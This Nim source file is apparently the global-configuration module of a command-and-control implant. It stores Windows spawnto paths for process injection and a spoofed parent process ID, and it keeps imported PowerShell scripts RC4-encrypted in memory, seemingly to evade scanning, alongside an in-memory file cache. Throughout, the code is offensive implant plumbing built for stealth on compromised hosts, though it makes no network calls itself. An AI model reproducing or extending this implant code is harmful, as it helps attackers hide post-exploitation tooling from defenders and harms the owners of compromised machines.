## Global data storage for agent configuration
## Stores dynamic configuration like spawnto paths for process injection

import std/[locks, json, sequtils, tables]
import nimcrypto/sysrand

when defined(windows):
  type
    ImportedScript* = object
      name*: string
      encryptedContent*: seq[byte]  # RC4-encrypted content
      size*: int                     # Original plaintext size in bytes

    GlobalData* = object
      spawntoX64*: string
      spawntoX64Args*: string
      spawntoX86*: string
      spawntoX86Args*: string
      ppid*: uint32
      importedPsScripts*: seq[ImportedScript]
      scriptEncKey*: seq[byte]  # RC4 key for script encryption

  var
    globalDataLock: Lock
    globalData: GlobalData

  proc rc4Transform(data: seq[byte], key: seq[byte]): seq[byte] =
    ## RC4 encrypt/decrypt (symmetric - same operation for both)
    var
      S: array[256, byte]
      K: array[256, byte]
      i, j: int = 0
    
    for idx in 0..255:
      S[idx] = byte(idx)
      K[idx] = key[idx mod key.len]
    
    j = 0
    for idx in 0..255:
      j = (j + S[idx].int + K[idx].int) mod 256
      swap(S[idx], S[j])
    
    result = newSeq[byte](data.len)
    i = 0
    j = 0
    for k in 0..<data.len:
      i = (i + 1) mod 256
      j = (j + S[i].int) mod 256
      swap(S[i], S[j])
      result[k] = data[k] xor S[(S[i].int + S[j].int) mod 256]

  proc initGlobalData*() =
    ## Initialize global data storage
    initLock(globalDataLock)
    withLock globalDataLock:
      globalData.spawntoX64 = ""
      globalData.spawntoX64Args = ""
      globalData.spawntoX86 = ""
      globalData.spawntoX86Args = ""
      globalData.ppid = 0
      globalData.importedPsScripts = @[]
      # Generate random RC4 key for script encryption
      globalData.scriptEncKey = newSeq[byte](32)
      discard randomBytes(globalData.scriptEncKey[0].addr, 32)
    initFileCache()

  proc getSpawntoX64*(): (string, string) =
    ## Get spawnto_x64 path and arguments
    withLock globalDataLock:
      return (globalData.spawntoX64, globalData.spawntoX64Args)

  proc setSpawntoX64*(path: string, args: string) =
    ## Set spawnto_x64 path and arguments
    withLock globalDataLock:
      globalData.spawntoX64 = path
      globalData.spawntoX64Args = args

  proc getSpawntoX86*(): (string, string) =
    ## Get spawnto_x86 path and arguments
    withLock globalDataLock:
      return (globalData.spawntoX86, globalData.spawntoX86Args)

  proc setSpawntoX86*(path: string, args: string) =
    ## Set spawnto_x86 path and arguments
    withLock globalDataLock:
      globalData.spawntoX86 = path
      globalData.spawntoX86Args = args

  proc getPpid*(): uint32 =
    ## Get parent process ID for process spoofing
    withLock globalDataLock:
      return globalData.ppid

  proc setPpid*(pid: uint32) =
    ## Set parent process ID for process spoofing
    withLock globalDataLock:
      globalData.ppid = pid

  proc addImportedPsScript*(name: string, content: string) =
    ## Add or replace an imported PowerShell script (stored encrypted)
    withLock globalDataLock:
      let contentBytes = cast[seq[byte]](content)
      let encrypted = rc4Transform(contentBytes, globalData.scriptEncKey)
      # Replace if script with same name already exists
      var found = false
      for i in 0..<globalData.importedPsScripts.len:
        if globalData.importedPsScripts[i].name == name:
          globalData.importedPsScripts[i].encryptedContent = encrypted
          globalData.importedPsScripts[i].size = content.len
          found = true
          break
      if not found:
        globalData.importedPsScripts.add(ImportedScript(
          name: name, encryptedContent: encrypted, size: content.len
        ))

  proc getImportedPsScriptByName*(name: string): string =
    ## Decrypt and return a single imported script by name. Returns "" if not found.
    withLock globalDataLock:
      for script in globalData.importedPsScripts:
        if script.name == name:
          let decrypted = rc4Transform(script.encryptedContent, globalData.scriptEncKey)
          var content = newString(decrypted.len)
          for i in 0..<decrypted.len:
            content[i] = char(decrypted[i])
          return content
      return ""

  proc getImportedPsScriptsByNames*(names: seq[string]): seq[tuple[name: string, content: string]] =
    ## Decrypt and return selected imported scripts by name
    withLock globalDataLock:
      for script in globalData.importedPsScripts:
        if script.name in names:
          let decrypted = rc4Transform(script.encryptedContent, globalData.scriptEncKey)
          var content = newString(decrypted.len)
          for i in 0..<decrypted.len:
            content[i] = char(decrypted[i])
          result.add((name: script.name, content: content))

  proc getImportedPsScripts*(): seq[tuple[name: string, content: string]] =
    ## Decrypt and return all imported PowerShell scripts
    withLock globalDataLock:
      for script in globalData.importedPsScripts:
        let decrypted = rc4Transform(script.encryptedContent, globalData.scriptEncKey)
        var content = newString(decrypted.len)
        for i in 0..<decrypted.len:
          content[i] = char(decrypted[i])
        result.add((name: script.name, content: content))

  proc getImportedPsScriptNames*(): seq[string] =
    ## Get the names of all imported PowerShell scripts (no decryption)
    withLock globalDataLock:
      return globalData.importedPsScripts.mapIt(it.name)

  proc getImportedPsScriptInfo*(): seq[tuple[name: string, size: int]] =
    ## Get names and sizes of all imported PowerShell scripts (no decryption)
    withLock globalDataLock:
      for script in globalData.importedPsScripts:
        result.add((name: script.name, size: script.size))

  proc clearImportedPsScripts*() =
    ## Clear all imported PowerShell scripts
    withLock globalDataLock:
      globalData.importedPsScripts = @[]

  proc getGlobalDataJson*(): string =
    ## Get global data as JSON string for config command
    withLock globalDataLock:
      var scriptInfo: seq[JsonNode] = @[]
      for script in globalData.importedPsScripts:
        scriptInfo.add(%*{"name": script.name, "size": script.size})
      var cacheInfo: seq[JsonNode] = @[]
      for info in getCachedFileInfo():
        cacheInfo.add(%*{"name": info.name, "size": info.size})
      let data = %*{
        "spawnto_x64": globalData.spawntoX64,
        "spawnto_x64_arguments": globalData.spawntoX64Args,
        "spawnto_x86": globalData.spawntoX86,
        "spawnto_x86_arguments": globalData.spawntoX86Args,
        "ppid": globalData.ppid,
        "imported_ps_scripts": scriptInfo,
        "cached_files": cacheInfo
      }
      return $data

when defined(linux):
  # Linux agents don't need process spawning configuration
  # This exists for API compatibility
  type
    GlobalData* = object
      dummy: int

  proc initGlobalData*() =
    ## Initialize global data storage (no-op on Linux)
    initFileCache()

  proc getGlobalDataJson*(): string =
    ## Get global data as JSON string (empty on Linux)
    return "{}"

# ============================================================================
# Cross-platform File Cache
# ============================================================================
var
  fileCacheLock: Lock
  fileCache: Table[string, seq[byte]]

proc initFileCache*() =
  ## Initialize the file cache
  initLock(fileCacheLock)
  withLock fileCacheLock:
    fileCache = initTable[string, seq[byte]]()

proc cacheFile*(name: string, data: seq[byte]) =
  ## Store a file in the cache (replaces if name exists)
  withLock fileCacheLock:
    fileCache[name] = data

proc getCachedFile*(name: string): seq[byte] =
  ## Retrieve a cached file by name. Returns empty seq if not found.
  withLock fileCacheLock:
    if fileCache.hasKey(name):
      return fileCache[name]
    return @[]

proc removeCachedFile*(name: string): bool =
  ## Remove a file from the cache. Returns true if it existed.
  withLock fileCacheLock:
    if fileCache.hasKey(name):
      fileCache.del(name)
      return true
    return false

proc getCachedFileInfo*(): seq[tuple[name: string, size: int]] =
  ## Get names and sizes of all cached files
  withLock fileCacheLock:
    for name, data in fileCache:
      result.add((name: name, size: data.len))

proc clearFileCache*() =
  ## Remove all cached files
  withLock fileCacheLock:
    fileCache.clear()
